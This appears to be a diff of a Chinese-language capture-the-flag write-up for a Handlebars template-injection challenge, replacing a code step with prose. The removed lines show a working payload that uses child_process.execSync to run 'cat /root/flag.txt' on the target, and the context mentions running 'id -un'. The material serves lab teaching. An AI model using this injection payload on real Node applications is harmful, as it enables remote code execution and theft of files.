@@ -52,22 +52,9 @@ python3 exploit.py --url http://<TARGET>
 
 脚本先执行 `id -un`，确认命令执行上下文，再读取目标 Flag。它不依赖 CI 的预期答案变量，也不会访问目标容器的 Docker 管理接口。
 
-## 4. 读取 Flag
+## 4. 提交 Flag
 
-通过同一条命令执行链读取目标文件：
-
-```python
-status, body = post(
-    target,
-    handlebars_rce(
-        "process.mainModule.require('child_process').execSync('cat /root/flag.txt')"
-    ),
-)
-print(status)
-print(body)
-```
-
-提交响应中取得的 Flag 即可完成本题。
+`exploit.py` 会在同一条命令执行链中读取 `/root/flag.txt`，Flag 会显示在 HTTP 响应内容中。将取得的值提交到平台即可完成本题。
 
 ## 5. 关键原因
 
